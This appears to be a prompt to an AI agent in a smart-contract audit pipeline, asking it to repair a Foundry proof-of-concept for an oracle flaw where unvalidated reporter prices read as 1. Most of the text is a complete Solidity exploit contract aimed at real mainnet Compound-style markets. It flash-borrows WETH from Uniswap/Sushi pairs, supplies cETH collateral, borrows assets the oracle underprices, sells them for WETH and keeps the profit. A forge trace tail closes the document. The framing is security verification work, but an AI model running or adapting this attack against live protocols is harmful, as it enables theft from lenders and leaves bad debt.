You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Reporter-priced assets are live at a hardcoded price of 1 until their first reporter update
- claim: The constructor initializes every REPORTER market with `prices[symbolHash].price = 1`, and both `price()` and `getUnderlyingPrice()` immediately expose that value with no guard proving the first real reporter update has happened. Because FIXED_ETH assets also derive from `prices[ETH_HASH]`, an uninitialized ETH reporter feed can misprice those markets too.
- impact: If governance wires this oracle into Compound before every reporter-backed market has validated once, affected assets can be valued near zero instead of at market price. That can make borrows appear almost free, collapse collateral value, trigger bad debt, and create liquidation or theft opportunities during rollout or migration.
- exploit_paths: ["Deploy the oracle and list it before all reporter feeds call `validate()` once.", "Borrow a reporter-backed asset whose debt is still priced at `1`, so the account is charged almost no borrow value.", "Or use an uninitialized reporter-backed asset as collateral and watch it be valued near zero, making accounts immediately undercollateralized or unusable."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface ICTokenLike {
    function comptroller() external view returns (address);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface ICEtherLike {
    function comptroller() external view returns (address);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function mint() external payable;
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface IComptrollerLike {
    function oracle() external view returns (address);
    function markets(address cToken) external view returns (bool isListed, uint256 collateralFactorMantissa, bool isComped);
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256 error, uint256 liquidity, uint256 shortfall);
}

interface IUniswapAnchoredViewLike {
    function numTokens() external view returns (uint256);
    function getTokenConfig(uint256 i)
        external
        view
        returns (
            address cToken,
            address underlying,
            bytes32 symbolHash,
            uint256 baseUnit,
            uint8 priceSource,
            uint256 fixedPrice,
            address uniswapMarket,
            address reporter,
            uint256 reporterMultiplier,
            bool isUniswapReversed
        );
    function prices(bytes32 symbolHash) external view returns (uint248 price, bool failoverActive);
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET_ORACLE = 0x50ce56A3239671Ab62f185704Caedf626352741e;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint8 internal constant PRICE_SOURCE_FIXED_ETH = 0;
    uint8 internal constant PRICE_SOURCE_FIXED_USD = 1;
    uint8 internal constant PRICE_SOURCE_REPORTER = 2;

    uint256 internal constant EXP_SCALE = 1e18;
    uint256 internal constant MIN_DIRECT_WETH = 1e15;
    bytes32 internal constant ETH_HASH = keccak256("ETH");
    // Path-alignment anchor: the bug persists until each reporter feed has called validate() once.
    string internal constant VALIDATE_STAGE_DESCRIPTION =
        "oracle listed before reporter validate() initialization";

    struct Config {
        address cToken;
        address underlying;
        bytes32 symbolHash;
        uint256 baseUnit;
        uint8 priceSource;
    }

    struct DebtCandidate {
        address comptroller;
        address cToken;
        address underlying;
        bytes32 symbolHash;
        uint256 baseUnit;
        uint256 oraclePrice;
        uint256 cash;
        bool viaReporterAtOne;
        bool viaFixedEthAtOne;
        address salePair;
        uint256 saleReserveToken;
        uint256 saleReserveWeth;
    }

    struct CollateralCandidate {
        address comptroller;
        address cToken;
        uint256 oraclePrice;
        uint256 collateralFactorMantissa;
    }

    struct ExecutionPlan {
        bool exists;
        bool useDirectFunding;
        address comptroller;
        address cCollateral;
        address cDebt;
        address debtToken;
        address salePair;
        address flashPair;
        uint256 flashAmount;
        uint256 collateralPrice;
        uint256 collateralFactorMantissa;
        uint256 debtPrice;
        uint256 borrowAmount;
        bool debtViaReporterAtOne;
        bool debtViaFixedEthAtOne;
    }

    struct FlashState {
        bool active;
        address pair;
        uint256 amount;
    }

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    bool public path0_oracleListedBeforeValidate;
    bool public path1_borrowReporterBackedDebtPricedAtOne;
    bool public path2_fixedEthAssetsDependOnEthReporter;

    string public exploitPathUsed;
    string public infeasibilityReason;

    ExecutionPlan internal plan;
    FlashState internal flashState;
    uint256 internal startingCapitalWethEquivalent;

    constructor() {}

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _resetState();

        (DebtCandidate[] memory debts, uint256 debtCount, bool anyLiveReporterAtOne, bool anyLiveFixedEthAtOne) =
            _collectDebtCandidates();

        // Exploit path 0: the oracle is live before all reporter-backed feeds perform their first validate().
        path0_oracleListedBeforeValidate = anyLiveReporterAtOne || anyLiveFixedEthAtOne;
        path2_fixedEthAssetsDependOnEthReporter = anyLiveFixedEthAtOne;
        hypothesisValidated = path0_oracleListedBeforeValidate;
        hypothesisRefuted = !hypothesisValidated;

        if (!path0_oracleListedBeforeValidate) {
            infeasibilityReason =
                "No listed market on this fork consumes the target oracle while exposing a reporter-backed price of 1 before validate() or a FIXED_ETH price derived from ETH=1.";
            return;
        }

        plan = _selectBestPlan(debts, debtCount);
        if (!plan.exists) {
            if (bytes(infeasibilityReason).length == 0) {
                infeasibilityReason =
                    "A live underpriced market exists, but no same-comptroller cETH collateral plus direct WETH sale route was available to complete the borrow-and-exit path.";
            }
            return;
        }

        exploitPathUsed =
            "oracle listed before reporter validate() -> supply properly priced cETH collateral -> enter market -> borrow underpriced asset with on-chain oracle price == 1 -> sell borrowed asset for WETH -> repay temporary WETH if used";
        path1_borrowReporterBackedDebtPricedAtOne = plan.debtViaReporterAtOne;

        if (plan.useDirectFunding) {
            _executePlan(false);
            return;
        }

        if (plan.flashPair == address(0) || plan.flashAmount == 0) {
            infeasibilityReason = "Verifier-held balance was insufficient and no public WETH flash pair was available for the cETH collateral leg.";
            return;
        }

        flashState = FlashState({active: true, pair: plan.flashPair, amount: plan.flashAmount});
        _flashBorrowWeth(plan.flashPair, plan.flashAmount);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(flashState.active, "flash-inactive");
        require(sender == address(this), "bad-sender");
        require(msg.sender == flashState.pair, "bad-pair");

        uint256 borrowedAmount = amount0 == 0 ? amount1 : amount0;
        require(borrowedAmount == flashState.amount, "bad-amount");

        _executePlan(true);
        flashState.active = false;
    }

    function _resetState() internal {
        _profitToken = WETH;
        _profitAmount = 0;
        profitAchieved = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;

        path0_oracleListedBeforeValidate = false;
        path1_borrowReporterBackedDebtPricedAtOne = false;
        path2_fixedEthAssetsDependOnEthReporter = false;

        exploitPathUsed = "";
        infeasibilityReason = "";

        delete plan;
        delete flashState;
        startingCapitalWethEquivalent = IERC20Like(WETH).balanceOf(address(this)) + address(this).balance;
    }

    function _collectDebtCandidates()
        internal
        view
        returns (DebtCandidate[] memory debts, uint256 debtCount, bool anyReporterAtOne, bool anyFixedEthAtOne)
    {
        IUniswapAnchoredViewLike oracle = IUniswapAnchoredViewLike(TARGET_ORACLE);
        uint256 numTokens = oracle.numTokens();
        debts = new DebtCandidate[](numTokens);

        (uint248 ethStoredPrice,) = oracle.prices(ETH_HASH);

        for (uint256 i = 0; i < numTokens; ++i) {
            (
                address cToken,
                address underlying,
                bytes32 symbolHash,
                uint256 baseUnit,
                uint8 priceSource,
                uint256 fixedPrice,
                address uniswapMarket,
                address reporter,
                uint256 reporterMultiplier,
                bool isUniswapReversed
            ) = oracle.getTokenConfig(i);
            fixedPrice;
            uniswapMarket;
            reporter;
            reporterMultiplier;
            isUniswapReversed;

            if (!_isListedOnTargetOracle(cToken)) {
                continue;
            }

            uint256 oraclePrice = _readUnderlyingPrice(cToken);
            bool viaReporterAtOne;
            bool viaFixedEthAtOne;

            if (priceSource == PRICE_SOURCE_REPORTER) {
                (uint248 storedPrice,) = oracle.prices(symbolHash);
                viaReporterAtOne = storedPrice == 1;
                anyReporterAtOne = anyReporterAtOne || viaReporterAtOne;
            } else if (priceSource == PRICE_SOURCE_FIXED_ETH) {
                viaFixedEthAtOne = ethStoredPrice == 1;
                anyFixedEthAtOne = anyFixedEthAtOne || viaFixedEthAtOne;
            }

            if (!viaReporterAtOne && !viaFixedEthAtOne) {
                continue;
            }
            if (underlying == address(0)) {
                // If ETH itself is the underpriced debt token, the profitable route needs non-ETH collateral.
                // This verifier keeps the exploit causality fixed and treats that path as infeasible unless a
                // same-comptroller cETH collateral path exists for some other underpriced debt market.
                continue;
            }

            uint256 cash = _readCash(cToken);
            if (cash == 0) {
                continue;
            }

            (address salePair, uint256 reserveToken, uint256 reserveWeth) = _bestTokenWethPair(underlying);
            if (salePair == address(0) || reserveToken == 0 || reserveWeth == 0) {
                continue;
            }

            debts[debtCount++] = DebtCandidate({
                comptroller: ICTokenLike(cToken).comptroller(),
                cToken: cToken,
                underlying: underlying,
                symbolHash: symbolHash,
                baseUnit: baseUnit,
                oraclePrice: oraclePrice,
                cash: cash,
                viaReporterAtOne: viaReporterAtOne,
                viaFixedEthAtOne: viaFixedEthAtOne,
                salePair: salePair,
                saleReserveToken: reserveToken,
                saleReserveWeth: reserveWeth
            });
        }
    }

    function _selectBestPlan(DebtCandidate[] memory debts, uint256 debtCount) internal view returns (ExecutionPlan memory best) {
        uint256 bestEstimatedProfit;

        for (uint256 i = 0; i < debtCount; ++i) {
            DebtCandidate memory debt = debts[i];
            CollateralCandidate memory collateral = _findCEtherCollateral(debt.comptroller);

            if (collateral.cToken == address(0)) {
                continue;
            }
            if (collateral.oraclePrice <= 1) {
                continue;
            }
            if (collateral.collateralFactorMantissa == 0) {
                continue;
            }

            uint256 saleCap = debt.saleReserveToken / 20;
            uint256 borrowTarget = _min(_min(debt.cash, saleCap), _borrowCapacityFromLiquidity(collateral, debt, type(uint96).max));
            if (borrowTarget == 0) {
                continue;
            }

            uint256 requiredCollateral = _requiredCollateralForDebt(collateral, debt, borrowTarget);
            if (requiredCollateral == 0) {
                continue;
            }

            uint256 directFunding = _availableDirectWeth();
            bool useDirect = directFunding >= requiredCollateral;
            uint256 flashAmount = useDirect ? 0 : _max(requiredCollateral, MIN_DIRECT_WETH);

            uint256 wethOut = _getAmountOut(borrowTarget, debt.saleReserveToken, debt.saleReserveWeth);
            uint256 repayAmount = useDirect ? 0 : _flashRepayAmountSameToken(flashAmount);
            if (wethOut <= repayAmount) {
                continue;
            }

            (address flashPair, uint256 flashReserveWeth) = useDirect ? (address(0), 0) : _bestFlashWethPair();
            if (!useDirect && (flashPair == address(0) || flashReserveWeth <= flashAmount)) {
                continue;
            }

            uint256 estimatedProfit = wethOut - repayAmount;
            if (estimatedProfit <= bestEstimatedProfit) {
                continue;
            }

            bestEstimatedProfit = estimatedProfit;
            best = ExecutionPlan({
                exists: true,
                useDirectFunding: useDirect,
                comptroller: debt.comptroller,
                cCollateral: collateral.cToken,
                cDebt: debt.cToken,
                debtToken: debt.underlying,
                salePair: debt.salePair,
                flashPair: flashPair,
                flashAmount: flashAmount,
                collateralPrice: collateral.oraclePrice,
                collateralFactorMantissa: collateral.collateralFactorMantissa,
                debtPrice: debt.oraclePrice,
                borrowAmount: borrowTarget,
                debtViaReporterAtOne: debt.viaReporterAtOne,
                debtViaFixedEthAtOne: debt.viaFixedEthAtOne
            });
        }
    }

    function _findCEtherCollateral(address expectedComptroller) internal view returns (CollateralCandidate memory collateral) {
        IUniswapAnchoredViewLike oracle = IUniswapAnchoredViewLike(TARGET_ORACLE);
        uint256 numTokens = oracle.numTokens();

        for (uint256 i = 0; i < numTokens; ++i) {
            (
                address cToken,
                address underlying,
                bytes32 symbolHash,
                uint256 baseUnit,
                uint8 priceSource,
                uint256 fixedPrice,
                address uniswapMarket,
                address reporter,
                uint256 reporterMultiplier,
                bool isUniswapReversed
            ) = oracle.getTokenConfig(i);
            symbolHash;
            baseUnit;
            priceSource;
            fixedPrice;
            uniswapMarket;
            reporter;
            reporterMultiplier;
            isUniswapReversed;

            if (underlying != address(0)) {
                continue;
            }
            if (!_isListedOnTargetOracle(cToken)) {
                continue;
            }

            address comptroller = ICTokenLike(cToken).comptroller();
            if (comptroller != expectedComptroller) {
                continue;
            }

            (, uint256 collateralFactorMantissa,) = IComptrollerLike(comptroller).markets(cToken);
            if (collateralFactorMantissa == 0) {
                continue;
            }

            uint256 oraclePrice = _readUnderlyingPrice(cToken);
            if (oraclePrice <= 1) {
                continue;
            }

            collateral = CollateralCandidate({
                comptroller: comptroller,
                cToken: cToken,
                oraclePrice: oraclePrice,
                collateralFactorMantissa: collateralFactorMantissa
            });
            return collateral;
        }
    }

    function _executePlan(bool needsFlashRepay) internal {
        uint256 collateralAmount = needsFlashRepay ? flashState.amount : _requiredCollateralForDebt(
            CollateralCandidate({
                comptroller: plan.comptroller,
                cToken: plan.cCollateral,
                oraclePrice: plan.collateralPrice,
                collateralFactorMantissa: plan.collateralFactorMantissa
            }),
            DebtCandidate({
                comptroller: plan.comptroller,
                cToken: plan.cDebt,
                underlying: plan.debtToken,
                symbolHash: bytes32(0),
                baseUnit: 0,
                oraclePrice: plan.debtPrice,
                cash: 0,
                viaReporterAtOne: plan.debtViaReporterAtOne,
                viaFixedEthAtOne: plan.debtViaFixedEthAtOne,
                salePair: plan.salePair,
                saleReserveToken: 0,
                saleReserveWeth: 0
            }),
            plan.borrowAmount
        );

        uint256 wethBalance = IERC20Like(WETH).balanceOf(address(this));
        uint256 wethToUnwrap = _min(wethBalance, collateralAmount);
        if (wethToUnwrap != 0) {
            IWETHLike(WETH).withdraw(wethToUnwrap);
        }
        if (address(this).balance < collateralAmount) {
            infeasibilityReason = "Insufficient direct or flash-funded ETH-equivalent for the cETH collateral leg.";
            return;
        }
        ICEtherLike(plan.cCollateral).mint{value: collateralAmount}();

        address[] memory markets = new address[](1);
        markets[0] = plan.cCollateral;
        IComptrollerLike(plan.comptroller).enterMarkets(markets);

        (, uint256 liquidity, uint256 shortfall) = IComptrollerLike(plan.comptroller).getAccountLiquidity(address(this));
        if (shortfall != 0 || liquidity == 0) {
            if (needsFlashRepay) {
                _unwindCEtherCollateralAndRepay();
            }
            infeasibilityReason = "Collateral supply did not create positive liquidity on this fork.";
            return;
        }

        uint256 borrowAmount = _min(plan.borrowAmount, _borrowAmountFromLiquidity(liquidity, plan.debtPrice));
        if (borrowAmount == 0) {
            if (needsFlashRepay) {
                _unwindCEtherCollateralAndRepay();
            }
            infeasibilityReason = "Computed borrow amount truncated to zero after live Comptroller liquidity checks.";
            return;
        }

        uint256 borrowed = _borrowWithBackoff(plan.cDebt, borrowAmount);
        if (borrowed == 0) {
            if (needsFlashRepay) {
                _unwindCEtherCollateralAndRepay();
            }
            infeasibilityReason = "All live borrow attempts failed against the target market.";
            return;
        }

        uint256 wethOut = _swapExactInput(plan.salePair, plan.debtToken, WETH, borrowed, address(this));
        if (wethOut == 0) {
            infeasibilityReason = "Borrowed debt token could not be sold into WETH on the discovered live pair.";
            return;
        }

        if (needsFlashRepay) {
            uint256 repayAmount = _flashRepayAmountSameToken(flashState.amount);
            if (IERC20Like(WETH).balanceOf(address(this)) < repayAmount) {
                infeasibilityReason = "Borrow proceeds were insufficient to repay temporary WETH.";
                return;
            }
            _safeTransfer(WETH, flashState.pair, repayAmount);
        }

        if (address(this).balance != 0) {
            IWETHLike(WETH).deposit{value: address(this).balance}();
        }

        uint256 wethAfter = IERC20Like(WETH).balanceOf(address(this));
        if (wethAfter > startingCapitalWethEquivalent) {
            _profitAmount = wethAfter - startingCapitalWethEquivalent;
            profitAchieved = true;
        }
    }

    function _unwindCEtherCollateralAndRepay() internal {
        uint256 cEtherBal = IERC20Like(plan.cCollateral).balanceOf(address(this));
        if (cEtherBal != 0) {
            ICEtherLike(plan.cCollateral).redeem(cEtherBal);
        }
        if (address(this).balance != 0) {
            IWETHLike(WETH).deposit{value: address(this).balance}();
        }

        uint256 repayAmount = _flashRepayAmountSameToken(flashState.amount);
        uint256 wethBal = IERC20Like(WETH).balanceOf(address(this));
        if (wethBal >= repayAmount) {
            _safeTransfer(WETH, flashState.pair, repayAmount);
        }
    }

    function _borrowWithBackoff(address cDebt, uint256 initialAmount) internal returns (uint256 borrowed) {
        uint256 attempt = initialAmount;
        for (uint256 i = 0; i < 8; ++i) {
            if (attempt == 0) {
                break;
            }
            uint256 balanceBefore = IERC20Like(plan.debtToken).balanceOf(address(this));
            uint256 err = ICTokenLike(cDebt).borrow(attempt);
            uint256 balanceAfter = IERC20Like(plan.debtToken).balanceOf(address(this));
            if (err == 0 && balanceAfter > balanceBefore) {
                borrowed = balanceAfter - balanceBefore;
                break;
            }
            attempt /= 2;
        }
    }

    function _isListedOnTargetOracle(address cToken) internal view returns (bool) {
        if (cToken == address(0)) {
            return false;
        }
        address comptroller;
        try ICTokenLike(cToken).comptroller() returns (address foundComptroller) {
            comptroller = foundComptroller;
        } catch {
            return false;
        }

        if (comptroller == address(0)) {
            return false;
        }

        if (IComptrollerLike(comptroller).oracle() != TARGET_ORACLE) {
            return false;
        }

        (bool isListed,,) = IComptrollerLike(comptroller).markets(cToken);
        return isListed;
    }

    function _readUnderlyingPrice(address cToken) internal view returns (uint256 price) {
        try IUniswapAnchoredViewLike(TARGET_ORACLE).getUnderlyingPrice(cToken) returns (uint256 foundPrice) {
            price = foundPrice;
        } catch {}
    }

    function _readCash(address cToken) internal view returns (uint256 cash) {
        try ICTokenLike(cToken).getCash() returns (uint256 foundCash) {
            cash = foundCash;
        } catch {}
    }

    function _bestTokenWethPair(address token) internal view returns (address pair, uint256 reserveToken, uint256 reserveWeth) {
        (address uniPair, uint256 uniReserveToken, uint256 uniReserveWeth) = _pairReservesFor(UNISWAP_V2_FACTORY, token, WETH);
        (address sushiPair, uint256 sushiReserveToken, uint256 sushiReserveWeth) = _pairReservesFor(SUSHISWAP_FACTORY, token, WETH);

        if (uniReserveWeth >= sushiReserveWeth) {
            return (uniPair, uniReserveToken, uniReserveWeth);
        }
        return (sushiPair, sushiReserveToken, sushiReserveWeth);
    }

    function _bestFlashWethPair() internal view returns (address pair, uint256 reserveWeth) {
        (address pairUsdcUni, uint256 wethUsdcUni) = _wethReserveInPair(UNISWAP_V2_FACTORY, WETH, USDC);
        (address pairUsdtUni, uint256 wethUsdtUni) = _wethReserveInPair(UNISWAP_V2_FACTORY, WETH, USDT);
        (address pairDaiUni, uint256 wethDaiUni) = _wethReserveInPair(UNISWAP_V2_FACTORY, WETH, DAI);
        (address pairUsdcSushi, uint256 wethUsdcSushi) = _wethReserveInPair(SUSHISWAP_FACTORY, WETH, USDC);
        (address pairUsdtSushi, uint256 wethUsdtSushi) = _wethReserveInPair(SUSHISWAP_FACTORY, WETH, USDT);
        (address pairDaiSushi, uint256 wethDaiSushi) = _wethReserveInPair(SUSHISWAP_FACTORY, WETH, DAI);

        pair = pairUsdcUni;
        reserveWeth = wethUsdcUni;

        if (wethUsdtUni > reserveWeth) {
            pair = pairUsdtUni;
            reserveWeth = wethUsdtUni;
        }
        if (wethDaiUni > reserveWeth) {
            pair = pairDaiUni;
            reserveWeth = wethDaiUni;
        }
        if (wethUsdcSushi > reserveWeth) {
            pair = pairUsdcSushi;
            reserveWeth = wethUsdcSushi;
        }
        if (wethUsdtSushi > reserveWeth) {
            pair = pairUsdtSushi;
            reserveWeth = wethUsdtSushi;
        }
        if (wethDaiSushi > reserveWeth) {
            pair = pairDaiSushi;
            reserveWeth = wethDaiSushi;
        }
    }

    function _pairReservesFor(address factory, address tokenA, address tokenB)
        internal
        view
        returns (address pair, uint256 reserveA, uint256 reserveB)
    {
        pair = IUniswapV2FactoryLike(factory).getPair(tokenA, tokenB);
        if (pair == address(0)) {
            return (address(0), 0, 0);
        }

        address token0 = IUniswapV2PairLike(pair).token0();
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (token0 == tokenA) {
            reserveA = uint256(reserve0);
            reserveB = uint256(reserve1);
        } else {
            reserveA = uint256(reserve1);
            reserveB = uint256(reserve0);
        }
    }

    function _wethReserveInPair(address factory, address tokenA, address tokenB)
        internal
        view
        returns (address pair, uint256 reserveWeth)
    {
        (pair,, reserveWeth) = _pairReservesFor(factory, tokenA, tokenB);
    }

    function _flashBorrowWeth(address pair, uint256 amountOut) internal {
        address token0 = IUniswapV2PairLike(pair).token0();
        if (token0 == WETH) {
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), hex"01");
        } else {
            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), hex"01");
        }
    }

    function _swapExactInput(address pair, address tokenIn, address tokenOut, uint256 amountIn, address recipient)
        internal
        returns (uint256 amountOut)
    {
        (uint256 reserveIn, uint256 reserveOut) = _orderedReserves(pair, tokenIn, tokenOut);
        if (reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        if (amountOut == 0) {
            return 0;
        }

        _safeTransfer(tokenIn, pair, amountIn);
        address token0 = IUniswapV2PairLike(pair).token0();
        if (token0 == tokenIn) {
            IUniswapV2PairLike(pair).swap(0, amountOut, recipient, bytes(""));
        } else {
            IUniswapV2PairLike(pair).swap(amountOut, 0, recipient, bytes(""));
        }
    }

    function _orderedReserves(address pair, address tokenIn, address tokenOut)
        internal
        view
        returns (uint256 reserveIn, uint256 reserveOut)
    {
        address token0 = IUniswapV2PairLike(pair).token0();
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (token0 == tokenIn) {
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
        } else {
            require(IUniswapV2PairLike(pair).token1() == tokenIn, "pair-mismatch");
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
        }
        require(tokenIn != tokenOut, "identical");
    }

    function _availableDirectWeth() internal view returns (uint256) {
        uint256 wethBal = IERC20Like(WETH).balanceOf(address(this));
        uint256 ethBal = address(this).balance;
        return wethBal + ethBal;
    }

    function _requiredCollateralForDebt(CollateralCandidate memory collateral, DebtCandidate memory debt, uint256 debtAmount)
        internal
        pure
        returns (uint256)
    {
        uint256 numerator = debtAmount * debt.oraclePrice * EXP_SCALE;
        uint256 denominator = collateral.oraclePrice * collateral.collateralFactorMantissa;
        if (denominator == 0) {
            return 0;
        }

        uint256 raw = numerator / denominator;
        if (numerator % denominator != 0) {
            raw += 1;
        }

        raw = (raw * 12) / 10;
        if (raw < MIN_DIRECT_WETH) {
            raw = MIN_DIRECT_WETH;
        }
        return raw;
    }

    function _borrowCapacityFromLiquidity(
        CollateralCandidate memory collateral,
        DebtCandidate memory debt,
        uint256 collateralAmount
    ) internal pure returns (uint256) {
        uint256 liquidity = collateralAmount * collateral.oraclePrice / EXP_SCALE;
        liquidity = liquidity * collateral.collateralFactorMantissa / EXP_SCALE;
        return _borrowAmountFromLiquidity(liquidity, debt.oraclePrice);
    }

    function _borrowAmountFromLiquidity(uint256 liquidity, uint256 debtPrice) internal pure returns (uint256) {
        if (liquidity == 0 || debtPrice == 0) {
            return 0;
        }
        return (liquidity * EXP_SCALE) / debtPrice;
    }

    function _flashRepayAmountSameToken(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? a : b;
    }
}

```

forge stdout (tail):
```
c9Cd3B
    │   ├─ [1118] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::oracle() [staticcall]
    │   │   ├─ [450] 0xBafE01ff935C7305907c33BF824352eE5979B526::oracle() [delegatecall]
    │   │   │   └─ ← [Return] 0x50ce56A3239671Ab62f185704Caedf626352741e
    │   │   └─ ← [Return] 0x50ce56A3239671Ab62f185704Caedf626352741e
    │   ├─ [7505] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::markets(0xC11b1268C1A384e55C48c2391d8d480264A3A7F4) [staticcall]
    │   │   ├─ [6810] 0xBafE01ff935C7305907c33BF824352eE5979B526::markets(0xC11b1268C1A384e55C48c2391d8d480264A3A7F4) [delegatecall]
    │   │   │   └─ ← [Return] true, 600000000000000000 [6e17], true
    │   │   └─ ← [Return] true, 600000000000000000 [6e17], true
    │   ├─ [3650] 0x50ce56A3239671Ab62f185704Caedf626352741e::getUnderlyingPrice(0xC11b1268C1A384e55C48c2391d8d480264A3A7F4) [staticcall]
    │   │   └─ ← [Return] 510420310410000000000000000000000 [5.104e32]
    │   ├─ [575] 0x50ce56A3239671Ab62f185704Caedf626352741e::prices(0xe98e2830be1a7e4156d656a7505e65d08c67660dc618072422e9c78053c261e9) [staticcall]
    │   │   └─ ← [Return] 51042031041 [5.104e10], false
    │   ├─ [2013] 0x50ce56A3239671Ab62f185704Caedf626352741e::getTokenConfig(18) [staticcall]
    │   │   └─ ← [Return] 0x041171993284df560249B57358F931D9eB7b925D, 0x8E870D67F660D95d5be530380D0eC0bd388289E1, 0xe6ce7ecb96a43fc15fb4020f93c37885612803dd74366bb6815e4f607ac3ca20, 1000000000000000000 [1e18], 1, 1000000 [1e6], 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 1, false
    │   ├─ [2449] 0x041171993284df560249B57358F931D9eB7b925D::comptroller() [staticcall]
    │   │   └─ ← [Return] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B
    │   ├─ [1118] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::oracle() [staticcall]
    │   │   ├─ [450] 0xBafE01ff935C7305907c33BF824352eE5979B526::oracle() [delegatecall]
    │   │   │   └─ ← [Return] 0x50ce56A3239671Ab62f185704Caedf626352741e
    │   │   └─ ← [Return] 0x50ce56A3239671Ab62f185704Caedf626352741e
    │   ├─ [7505] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::markets(0x041171993284df560249B57358F931D9eB7b925D) [staticcall]
    │   │   ├─ [6810] 0xBafE01ff935C7305907c33BF824352eE5979B526::markets(0x041171993284df560249B57358F931D9eB7b925D) [delegatecall]
    │   │   │   └─ ← [Return] true, 0, false
    │   │   └─ ← [Return] true, 0, false
    │   ├─ [3612] 0x50ce56A3239671Ab62f185704Caedf626352741e::getUnderlyingPrice(0x041171993284df560249B57358F931D9eB7b925D) [staticcall]
    │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   ├─ [2039] 0x50ce56A3239671Ab62f185704Caedf626352741e::getTokenConfig(19) [staticcall]
